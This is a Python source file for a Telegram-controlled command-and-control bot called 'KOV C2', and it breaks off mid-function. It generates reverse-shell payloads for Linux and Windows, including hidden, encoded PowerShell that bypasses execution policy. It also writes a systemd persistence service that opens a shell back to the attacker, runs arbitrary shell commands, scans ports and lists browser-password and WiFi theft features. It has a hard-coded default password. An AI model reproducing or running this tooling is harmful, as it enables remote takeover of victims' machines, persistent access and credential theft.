from flask import Flask
import threading
import os

app = Flask(__name__)

@app.route("/")
def home():
    return "KOV C2 Running"





#!/usr/bin/env python3
import os
import sys
import json
import time
import base64
import sqlite3
import shutil
import stat
import struct
import socket
import threading
import subprocess
import logging
import tempfile
import zipfile
import io
import re
import platform
from datetime import datetime, timedelta
from pathlib import Path

def install_dependencies():
    required_packages = [
        'python-telegram-bot',
        'cryptography',
        'psutil',
        'requests',
    ]
    
    for pkg in required_packages:
        import_name = pkg.replace('-', '_')
        if import_name == 'python_telegram_bot':
            import_name = 'telegram'
        
        try:
            __import__(import_name)
            print(f"[✓] {pkg}")
        except ImportError:
            print(f"[*] Installing {pkg}...")
            try:
                subprocess.check_call(
                    [sys.executable, '-m', 'pip', 'install', '--quiet', pkg],
                    timeout=120
                )
                print(f"[✓] {pkg} installed")
            except:
                try:
                    termux_pkg = pkg.replace('python-telegram-bot', 'python-telegram-bot') \
                                     .replace('cryptography', 'python-cryptography') \
                                     .replace('psutil', 'python-psutil') \
                                     .replace('requests', 'python-requests')
                    subprocess.check_call(['pkg', 'install', '-y', termux_pkg], timeout=120)
                    print(f"[✓] {pkg} via pkg")
                except:
                    print(f"[!] Failed: {pkg}")

print("[*] Checking dependencies...")
install_dependencies()
print("[*] All dependencies ready!")

try:
    import psutil
    import requests
    from cryptography.fernet import Fernet
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
    from telegram.ext import (
        ApplicationBuilder, CommandHandler, CallbackQueryHandler,
        MessageHandler, filters, ContextTypes, ConversationHandler
    )
    from telegram.constants import ParseMode
except ImportError as e:
    print(f"[!] Import failed: {e}")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet',
                          'python-telegram-bot', 'cryptography', 'psutil', 'requests'])
    import psutil
    import requests
    from cryptography.fernet import Fernet
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
    from telegram.ext import (
        ApplicationBuilder, CommandHandler, CallbackQueryHandler,
        MessageHandler, filters, ContextTypes, ConversationHandler
    )
    from telegram.constants import ParseMode

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = 8571274512
BANNER_URL = "https://res.cloudinary.com/dqxlb29uz/image/upload/v1778756785/bwm_uploads/media-1778756785484.jpg"
DB_PATH = Path.home() / ".d4rk_c2.db"
KEY_PATH = Path.home() / ".d4rk_key.key"
PASS_HASH_PATH = Path.home() / ".d4rk_pass.hash"
ADMINS_PATH = Path.home() / ".d4rk_admins.json"
BANNED_PATH = Path.home() / ".d4rk_banned.json"

(AUTH_PASS, TARGET_SELECT, CUSTOM_CMD, PORT_SCAN,
 BRUTE_SETUP, LISTENER_SETUP, FILE_UPLOAD, FILE_DOWNLOAD,
 ADMIN_INPUT) = range(9)  

def load_json(path):
    if path.exists():
        with open(path) as f:
            return json.load(f)
    return []

def save_json(path, data):
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)

def get_admins():
    admins = load_json(ADMINS_PATH)
    if ADMIN_ID not in admins:
        admins.append(ADMIN_ID)
        save_json(ADMINS_PATH, admins)
    return admins

def add_admin(user_id):
    admins = get_admins()
    if user_id not in admins:
        admins.append(user_id)
        save_json(ADMINS_PATH, admins)
        return True
    return False

def remove_admin(user_id):
    if user_id == ADMIN_ID:
        return False
    admins = get_admins()
    if user_id in admins:
        admins.remove(user_id)
        save_json(ADMINS_PATH, admins)
        return True
    return False

def get_banned():
    return load_json(BANNED_PATH)

def ban_user(user_id):
    banned = get_banned()
    if user_id not in banned:
        banned.append(user_id)
        save_json(BANNED_PATH, banned)
        return True
    return False

def unban_user(user_id):
    banned = get_banned()
    if user_id in banned:
        banned.remove(user_id)
        save_json(BANNED_PATH, banned)
        return True
    return False

def is_admin(user_id):
    return user_id in get_admins()

def is_owner(user_id):
    return user_id == ADMIN_ID

def is_banned(user_id):
    return user_id in get_banned()

def get_db():
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.executescript('''
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hostname TEXT NOT NULL,
            ip TEXT NOT NULL,
            os TEXT,
            username TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'active',
            listener_port INTEGER DEFAULT 4444,
            encryption_key TEXT
        );
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            session_id TEXT UNIQUE,
            shell_type TEXT DEFAULT 'reverse',
            active INTEGER DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            command TEXT NOT NULL,
            output TEXT,
            status TEXT DEFAULT 'pending',
            executed_at TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            filename TEXT NOT NULL,
            filepath TEXT,
            filetype TEXT,
            size INTEGER,
            exfiltrated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            source TEXT,
            url TEXT,
            username TEXT,
            password TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
    ''')
    conn.commit()
    conn.close()

def get_or_create_key():
    if KEY_PATH.exists():
        with open(KEY_PATH, 'rb') as f:
            return Fernet(f.read())
    key = Fernet.generate_key()
    with open(KEY_PATH, 'wb') as f:
        f.write(key)
    return Fernet(key)

cipher = get_or_create_key()

def encrypt_data(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt_data(data: str) -> str:
    try:
        return cipher.decrypt(data.encode()).decode()
    except:
        return "[DECRYPTION FAILED]"

def set_password(password: str):
    from hashlib import sha256
    h = sha256(password.encode()).hexdigest()
    with open(PASS_HASH_PATH, 'w') as f:
        f.write(h)

def check_password(password: str) -> bool:
    from hashlib import sha256
    if not PASS_HASH_PATH.exists():
        set_password("d4rk123")
        return password == "d4rk123"
    with open(PASS_HASH_PATH, 'r') as f:
        stored = f.read().strip()
    return sha256(password.encode()).hexdigest() == stored

def build_start_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔐 LOGIN", callback_data="start_login"),
         InlineKeyboardButton("ℹ️ ABOUT", callback_data="start_about")]
    ]
    return InlineKeyboardMarkup(keyboard)

def build_main_menu(is_owner_user=False):
    keyboard = [
        [InlineKeyboardButton("🎯 TARGETS", callback_data="menu_targets"),
         InlineKeyboardButton("💻 SHELL", callback_data="menu_shell")],
        [InlineKeyboardButton("🔍 SCANNER", callback_data="menu_scan"),
         InlineKeyboardButton("📁 FILES", callback_data="menu_files")],
        [InlineKeyboardButton("💉 PAYLOADS", callback_data="menu_payloads"),
         InlineKeyboardButton("🎧 LISTENER", callback_data="menu_listener")],
        [InlineKeyboardButton("🖥 SYSTEM INFO", callback_data="menu_info"),
         InlineKeyboardButton("📊 STATUS", callback_data="menu_status")],
        [InlineKeyboardButton("🧰 POST-EXPLOIT", callback_data="menu_postex"),
         InlineKeyboardButton("🔨 BRUTE FORCE", callback_data="menu_brute")],
        [InlineKeyboardButton("📖 HELP", callback_data="menu_help"),
         InlineKeyboardButton("🚪 LOGOUT", callback_data="menu_logout")]
    ]
    
    if is_owner_user:
        keyboard.append([InlineKeyboardButton("⚙ ADMIN PANEL", callback_data="menu_admin")])
    
    return InlineKeyboardMarkup(keyboard)

def build_admin_menu():
    keyboard = [
        [InlineKeyboardButton("👥 ADD ADMIN", callback_data="admin_add"),
         InlineKeyboardButton("🗑 REMOVE ADMIN", callback_data="admin_remove")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="admin_ban"),
         InlineKeyboardButton("✅ UNBAN USER", callback_data="admin_unban")],
        [InlineKeyboardButton("📋 LIST ADMINS", callback_data="admin_list_admins"),
         InlineKeyboardButton("📋 BAN LIST", callback_data="admin_ban_list")],
        [InlineKeyboardButton("🔙 MAIN MENU", callback_data="menu_back")]
    ]
    return InlineKeyboardMarkup(keyboard)

def build_cancel_keyboard():
    keyboard = [[InlineKeyboardButton("❌ CANCEL", callback_data="admin_cancel")]]
    return InlineKeyboardMarkup(keyboard)

def build_back_keyboard():
    keyboard = [[InlineKeyboardButton("🔙 MAIN MENU", callback_data="menu_back")]]
    return InlineKeyboardMarkup(keyboard)

def network_scan(target_ip: str, ports: str = "1-1024") -> list:
    results = []
    try:
        port_range = ports.split('-')
        if len(port_range) == 2:
            start_p, end_p = int(port_range[0]), int(port_range[1])
        else:
            start_p = end_p = int(ports)
        
        for port in range(start_p, end_p + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    results.append({"port": port, "service": service, "state": "open"})
                sock.close()
            except:
                pass
    except:
        pass
    return results

def generate_reverse_shell(lhost: str, lport: int, platform_type: str = "linux") -> str:
    if platform_type == "linux":
        return f"""python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'"""
    elif platform_type == "windows":
        ps_code = f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()"""
        b64 = base64.b64encode(ps_code.encode()).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}"
    return "Unsupported platform"

def generate_persistence_script():
    return """#!/bin/bash
cat > /etc/systemd/system/d4rk-c2.service << 'EOF'
[Unit]
Description=D4RK-K1NG C2 Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl enable d4rk-c2.service
systemctl start d4rk-c2.service"""

def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "platform": "Linux",
        "platform_release": "",
        "platform_version": "",
        "architecture": "",
        "processor": "",
        "cpu_count": 0,
        "memory": "Unknown",
        "memory_used": "0%",
        "disk": "Unknown",
        "disk_used": "0%",
        "ip": "",
        "python_version": sys.version,
        "uptime": "Unknown"
    }
    
    try:
        info["platform"] = platform.system()
        info["platform_release"] = platform.release()
        info["architecture"] = platform.machine()
        info["processor"] = platform.processor()
    except:
        pass
    
    try:
        info["cpu_count"] = os.cpu_count()
        info["memory"] = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
        info["memory_used"] = f"{psutil.virtual_memory().percent}%"
        info["disk"] = f"{psutil.disk_usage('/').total / (1024**3):.2f} GB"
        info["disk_used"] = f"{psutil.disk_usage('/').percent}%"
        info["uptime"] = str(timedelta(seconds=int(time.time() - psutil.boot_time())))
    except:
        pass
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ip"] = s.getsockname()[0]
        s.close()
    except:
        info["ip"] = "Unknown"
    
    return info

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if is_banned(user_id):
        await update.message.reply_text("🚫 *ACCESS DENIED*\n\nYou have been banned from KOV C2 SARVER.\nContact the administrator if you believe this is a mistake.", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        await context.bot.send_photo(
            chat_id=update.effective_chat.id,
            photo=BANNER_URL,
            caption="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n      🔥 *KOV C2 SARVER* 🔥\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass
    
    if is_admin(user_id):
        context.user_data['authenticated'] = True
        role = "👑 OWNER" if is_owner(user_id) else "🛡️ ADMIN"
        msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n      🔥 *KOV C2 SARVER* 🔥\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n*Developer:* D4RK-K1NG\n*User:* " + user.full_name + "\n*Role:* " + role + "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n*Welcome Back Commander!*"
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))
    else:
        msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n      🔥 *KOV C2 SARVER* 🔥\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n*Developer:* D4RK-K1NG\n*User:* " + user.full_name + "\n*ID:* `" + str(user_id) + "`\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n*Authorized Penetration Testing*\n*Advanced Command & Control*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🔐 *Please login to access the system*"
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())

async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned from KOV C2 SARVER.")
        return
    
    if len(context.args) == 0:
        await update.message.reply_text("Usage: /login <password>")
        return
    
    if check_password(context.args[0]):
        context.user_data['authenticated'] = True
        msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n         ✅ *LOGIN SUCCESSFUL*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nWelcome to KOV C2 SARVER."
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))
    else:
        await update.message.reply_text("❌ *Incorrect password!*", parse_mode=ParseMode.MARKDOWN)

async def setpass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /setpass <new_password>")
        return
    set_password(context.args[0])
    await update.message.reply_text("✅ *Password updated!*", parse_mode=ParseMode.MARKDOWN)

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    
    if not context.user_data.get('authenticated') and not is_admin(user_id):
        await update.message.reply_text("🔒 Use /login <password> first")
        return
    
    context.user_data['authenticated'] = True
    role = "👑 OWNER" if is_owner(user_id) else "🛡️ ADMIN"
    msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n          📋 *MAIN MENU*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nWelcome, " + update.effective_user.full_name + "\nRole: " + role + "\n\nSelect an option below:"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n     📖 *KOV C2 - COMMANDS*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n*AUTHENTICATION*\n/login <pass> - Login\n/setpass <pass> - Change password\n/menu - Show main menu\n\n*TARGETS*\n/targets - List targets\n/addtarget <hostname> <ip> - Add target\n/removetarget <id> - Remove target\n\n*COMMANDS*\n/shell <id> - Interactive shell\n/cmd <id> <cmd> - Execute command\n/scan <id> [ports] - Port scan\n\n*FILES*\n/upload <id> - Upload file\n/listfiles <id> - List files\n\n*POST-EXPLOITATION*\n/screenshot <id> - Screenshot\n/persistence <id> - Persistence\n/browserpass <id> - Browser passwords\n/wifi <id> - WiFi enumeration\n\n*OTHER*\n/payload <host> <port> [os] - Payload\n/listener <port> - Start listener\n/info - System info\n/status - Bot status\n\n*DEVELOPER:* D4RK-K1NG"
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n        ⚙️ *ADMIN PANEL*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nManage administrators and bans:"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())

async def add_admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /addadmin <telegram_id>")
        return
    try:
        target_id = int(context.args[0])
        if add_admin(target_id):
            await update.message.reply_text("✅ *Admin Added*\nUser ID: `" + str(target_id) + "`\n\nThey can now access without password.", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ User `" + str(target_id) + "` is already an admin.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("❌ Invalid ID. Use numeric Telegram user ID.")

async def remove_admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /removeadmin <telegram_id>")
        return
    try:
        target_id = int(context.args[0])
        if target_id == ADMIN_ID:
            await update.message.reply_text("❌ Cannot remove the owner.", parse_mode=ParseMode.MARKDOWN)
            return
        if remove_admin(target_id):
            await update.message.reply_text("✅ *Admin Removed*\nUser ID: `" + str(target_id) + "`", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ User `" + str(target_id) + "` is not an admin.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.")

async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /ban <telegram_id>")
        return
    try:
        target_id = int(context.args[0])
        if target_id == ADMIN_ID or is_admin(target_id):
            await update.message.reply_text("❌ Cannot ban an admin.", parse_mode=ParseMode.MARKDOWN)
            return
        if ban_user(target_id):
            await update.message.reply_text("✅ *User Banned*\nUser ID: `" + str(target_id) + "`", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ User `" + str(target_id) + "` is already banned.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.")

async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /unban <telegram_id>")
        return
    try:
        target_id = int(context.args[0])
        if unban_user(target_id):
            await update.message.reply_text("✅ *User Unbanned*\nUser ID: `" + str(target_id) + "`", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ User `" + str(target_id) + "` is not banned.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.")

async def list_admins_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    admins = get_admins()
    msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👥 *ADMINISTRATORS*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for aid in admins:
        tag = " 👑 OWNER" if aid == ADMIN_ID else ""
        msg += "  • `" + str(aid) + "`" + tag + "\n"
    msg += "\nTotal: `" + str(len(admins)) + "`"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def ban_list_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    banned = get_banned()
    if not banned:
        await update.message.reply_text("✅ *No users are banned.*", parse_mode=ParseMode.MARKDOWN)
        return
    msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🚫 *BANNED USERS*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for bid in banned:
        msg += "  • `" + str(bid) + "`\n"
    msg += "\nTotal: `" + str(len(banned)) + "`"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def targets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM targets ORDER BY last_seen DESC")
    rows = c.fetchall()
    conn.close()
    if not rows:
        await update.message.reply_text("📭 *No targets registered.*\nUse /addtarget to add one.", parse_mode=ParseMode.MARKDOWN)
        return
    msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🎯 *KOV C2 TARGETS*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for row in rows:
        status_icon = "🟢" if row['status'] == 'active' else "🔴"
        msg += "\n" + status_icon + " *ID:* `" + str(row['id']) + "`\n  ├ Hostname: `" + row['hostname'] + "`\n  ├ IP: `" + row['ip'] + "`\n  ├ OS: `" + (row['os'] or 'Unknown') + "`\n  └ Last Seen: `" + row['last_seen'] + "`\n"
    keyboard = []
    for row in rows[:10]:
        keyboard.append([InlineKeyboardButton("🎯 " + row['hostname'] + " (" + row['ip'] + ")", callback_data="target:" + str(row['id']))])
    keyboard.append([InlineKeyboardButton("🔙 MAIN MENU", callback_data="menu_back")])
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def add_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /addtarget <hostname> <ip>")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO targets (hostname, ip) VALUES (?, ?)", (context.args[0], context.args[1]))
    conn.commit()
    conn.close()
    await update.message.reply_text("✅ *Target added:* `" + context.args[0] + "` (" + context.args[1] + ")", parse_mode=ParseMode.MARKDOWN)

async def remove_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /removetarget <target_id>")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM targets WHERE id = ?", (context.args[0],))
    c.execute("DELETE FROM sessions WHERE target_id = ?", (context.args[0],))
    c.execute("DELETE FROM commands WHERE target_id = ?", (context.args[0],))
    c.execute("DELETE FROM files WHERE target_id = ?", (context.args[0],))
    c.execute("DELETE FROM credentials WHERE target_id = ?", (context.args[0],))
    conn.commit()
    conn.close()
    await update.message.reply_text("✅ *Target `" + context.args[0] + "` removed*", parse_mode=ParseMode.MARKDOWN)

async def shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /shell <target_id>")
        return
    target_id = context.args[0]
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM targets WHERE id = ?", (target_id,))
    target = c.fetchone()
    conn.close()
    if not target:
        await update.message.reply_text("❌ Target not found.")
        return
    context.user_data['shell_target'] = target_id
    await update.message.reply_text("💻 *Interactive Shell - " + target['hostname'] + "*\nSend commands directly. Use `exit` to close.\n━━━━━━━━━━━━━━━\n`" + target['hostname'] + " $ `", parse_mode=ParseMode.MARKDOWN)

async def cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /cmd <target_id> <command>")
        return
    target_id = context.args[0]
    command = ' '.join(context.args[1:])
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = "[No output]"
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO commands (target_id, command, output, status, executed_at) VALUES (?, ?, ?, 'completed', datetime('now'))", (target_id, command, output[:5000]))
        conn.commit()
        conn.close()
        if len(output) > 3500:
            output = output[:3500] + "\n\n...[truncated]..."
        await update.message.reply_text("💻 *Command Executed*\n`$ " + command + "`\n\n```\n" + output + "\n```", parse_mode=ParseMode.MARKDOWN)
    except subprocess.TimeoutExpired:
        await update.message.reply_text("⏰ *Command timed out*", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text("❌ *Error:* `" + str(e) + "`", parse_mode=ParseMode.MARKDOWN)

async def custom_cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return ConversationHandler.END
    await update.message.reply_text("✏️ *Send the command you want to execute:*", parse_mode=ParseMode.MARKDOWN)
    return CUSTOM_CMD

async def custom_cmd_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = update.message.text
    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
    output = result.stdout + result.stderr
    if not output:
        output = "[No output]"
    if len(output) > 3500:
        output = output[:3500] + "\n\n...[truncated]..."
    await update.message.reply_text("```\n" + output + "\n```", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚫 *Cancelled*", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /scan <target_id> [ports]\nExample: /scan 1 1-1000")
        return
    target_id = context.args[0]
    ports = context.args[1] if len(context.args) > 1 else "1-1024"
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM targets WHERE id = ?", (target_id,))
    target = c.fetchone()
    conn.close()
    if not target:
        await update.message.reply_text("❌ Target not found.")
        return
    await update.message.reply_text("🔍 *Scanning " + target['ip'] + ":" + ports + "...*", parse_mode=ParseMode.MARKDOWN)
    results = network_scan(target['ip'], ports)
    if not results:
        await update.message.reply_text("📭 *No open ports found*", parse_mode=ParseMode.MARKDOWN)
        return
    msg = "🔍 *Scan Results - " + target['ip'] + "*\n━━━━━━━━━━━━━━━━\n"
    for r in results[:30]:
        msg += "  ├ PORT `" + str(r['port']) + "` - " + r['service'] + " (" + r['state'] + ")\n"
    if len(results) > 30:
        msg += "  └ ... and " + str(len(results)-30) + " more ports\n"
    else:
        msg += "  └ Scan complete\n"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def nmap_wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /nmap <target> [args]\nExample: /nmap 192.168.1.1 -sV -p 80,443")
        return
    target = context.args[0]
    args = ' '.join(context.args[1:]) if len(context.args) > 1 else '-sS -sV -O'
    await update.message.reply_text("🔍 *Running nmap on " + target + "...*", parse_mode=ParseMode.MARKDOWN)
    try:
        result = subprocess.run("nmap " + args + " " + target, shell=True, capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr
        if len(output) > 3500:
            output = output[:3500] + "\n\n...[truncated]..."
        await update.message.reply_text("```\n" + output + "\n```", parse_mode=ParseMode.MARKDOWN)
    except FileNotFoundError:
